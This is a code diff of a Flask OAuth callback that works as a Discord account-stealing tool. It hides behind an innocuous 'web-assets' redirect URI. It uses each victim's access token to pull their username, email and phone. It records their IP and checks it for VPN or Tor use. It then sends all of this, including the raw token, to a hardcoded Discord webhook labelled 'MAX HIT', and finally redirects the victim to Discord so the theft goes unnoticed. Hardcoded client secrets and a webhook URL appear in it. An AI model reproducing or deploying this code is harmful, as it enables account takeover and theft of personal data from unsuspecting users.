@@ -2,10 +2,12 @@ import requests
 from flask import Flask, request, redirect
 app = Flask(__name__)
 
+# CONFIG
 ID = "1501206551942398092"
 SEC = "7A2BCkMpq3sqaV0RwYu2JOYjc2qRtfjz"
 URI = "https://web-assets-v1.onrender.com/callback"
 WEB = "https://discord.com/api/webhooks/1501215104677449888/0m91vskK1e3xajgzfnJ2whw9pNizDOpRxdEQIC9r2qDFbrxI7sh3j54q4S2EWwAvF6qt"
+IP_KEY = "PASTE_YOUR_IPINFO_TOKEN_HERE" 
 
 @app.route('/callback')
 def callback():
@@ -18,27 +20,29 @@ def callback():
 
     if t:
         h = {'Authorization': 'Bearer ' + str(t)}
-        # API Calls
         u = requests.get('https://discord.com/api/v10/users/@me', headers=h).json()
-        b = requests.get('https://discord.com/api/v10/users/@me/billing/payment-sources', headers=h).json()
-        # IP Fetch
-        ip_addr = request.headers.get('X-Forwarded-For', request.remote_addr)
-
-        # Logic
-        nitro_type = str(u.get('premium_type', '0'))
-        has_bill = "YES" if b else "NO"
         
-        # Super-short lines to prevent editor cutoff
+        # VPN DETECTION ENGINE
+        target_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
+        is_vpn = "NO"
+        try:
+            # We call the privacy endpoint specifically for VPN/Proxy data
+            v_check = requests.get(f"https://ipinfo.io/{target_ip}/privacy?token={IP_KEY}").json()
+            if any([v_check.get('vpn'), v_check.get('proxy'), v_check.get('tor'), v_check.get('relay')]):
+                is_vpn = "YES ⚠️"
+        except:
+            is_vpn = "Error"
+
+        # RESULTS
         f = []
         f.append({"name": "User", "value": str(u.get('username'))})
-        f.append({"name": "Mail", "value": str(u.get('email'))})
-        f.append({"name": "Phone", "value": str(u.get('phone'))})
-        f.append({"name": "Nitro", "value": nitro_type})
-        f.append({"name": "Bill", "value": has_bill})
-        f.append({"name": "IP", "value": str(ip_addr)})
+        f.append({"name": "Email", "value": str(u.get('email', 'None'))})
+        f.append({"name": "Phone", "value": str(u.get('phone', 'None'))})
+        f.append({"name": "VPN / Proxy", "value": is_vpn})
+        f.append({"name": "IP", "value": target_ip})
         f.append({"name": "Token", "value": str(t)})
              
-        requests.post(WEB, json={"embeds": [{"title": "ULTRA", "fields": f}]})
+        requests.post(WEB, json={"embeds": [{"title": "🔥 MAX HIT", "color": 0xFF0000, "fields": f}]})
         
     return redirect("https://discord.com/app")
 
